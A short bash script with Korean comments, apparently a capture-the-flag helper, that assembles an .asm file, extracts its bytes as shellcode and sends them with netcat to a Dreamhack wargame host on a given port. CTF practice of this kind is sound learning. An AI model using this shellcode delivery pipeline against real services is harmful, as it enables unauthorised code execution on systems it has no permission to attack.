#!/bin/bash

# 실행 예제
# ./shell-code.sh running-cat.asm 20258

# 첫 번째 인자: 어셈블리어 파일 이름
# 두 번째 인자: 포트
ASM_FILE=$1
PORT=$2

# 1단계: 어셈블리어 파일 컴파일
nasm -f elf64 $ASM_FILE -o temp.o

# 2단계: 오브젝트 파일 링크
ld temp.o -o temp

# 3단계: 바이너리에서 바이트 코드 추출
SHELLCODE=$(objdump -d temp | grep -Po '\s\K[a-f0-9]{2}(?=\s)' | tr -d '\n' | sed 's/../\\x&/g')

objdump -d temp

echo "SHELLCODE: $SHELLCODE"

# netcat을 사용하여 shellcode를 지정된 포트로 전송
echo -ne "$SHELLCODE" | nc host3.dreamhack.games $PORT

# 임시 파일 정리
rm temp.o temp
